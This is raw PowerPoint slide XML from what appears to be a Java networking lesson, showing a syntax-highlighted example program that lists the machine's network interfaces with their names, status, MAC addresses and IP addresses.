          <p:cNvPr id="60419" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="876300"/>
            <a:ext cx="11387667" cy="1338765"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>EX-4-8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Program to list all network interfaces</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60420" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="9232900" y="6388100"/>
            <a:ext cx="14414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InterfaceList</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1250420" y="1447800"/>
            <a:ext cx="9053513" cy="52625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b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import java.net.*;</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import java.util.*;</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public class InterfaceList {</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public static void main(String[] args) throws SocketException{</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try{</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Enumeration&lt;NetworkInterface&gt; interfaces = NetworkInterface.getNetworkInterfaces();</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while(interfaces.hasMoreElements()){</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NetworkInterface ni = interfaces.nextElement();</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//System.out.println("---------------");</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System.out.println(ni);</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//System.out.println("UP: " + ni.isUp());</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catch(Exception e){</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System.out.println(e);</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        </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"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a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">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228599" y="533400"/>
            <a:ext cx="5410201" cy="4786760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> java</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a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>net</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a:solidFill>
                  <a:srgbClr val="4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>*</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>util</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Enumeration</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>class</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetworkInterfaceExample</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>static</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>void</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main</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a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>try</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Enumeration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> interfaces </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetworkInterface</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getNetworkInterfaces</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>interfaces</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hasMoreElements</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetworkInterface</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>interfaces</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nextElement</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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println</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a:solidFill>
                  <a:srgbClr val="50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Interface: "</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</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getDisplayName</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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println</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a:solidFill>
                  <a:srgbClr val="50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Name: "</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</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getName</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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println</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a:solidFill>
                  <a:srgbClr val="50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Is Up: "</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</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isUp</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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println</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a:solidFill>
                  <a:srgbClr val="50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Is Loopback: "</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</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494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</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isLoopback</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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println</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a:solidFill>
                  <a:srgbClr val="50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"MAC Address: "</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>formatMAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</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getHardwareAddress</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a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Enumeration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> addresses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ni</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getInetAddresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</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a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1"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Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6184338" y="762000"/>
            <a:ext cx="5585266" cy="5582041"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addresses</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hasMoreElements</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err="1">
                <a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addr</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4078F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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addresses</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nextElement</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err="1">
                <a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
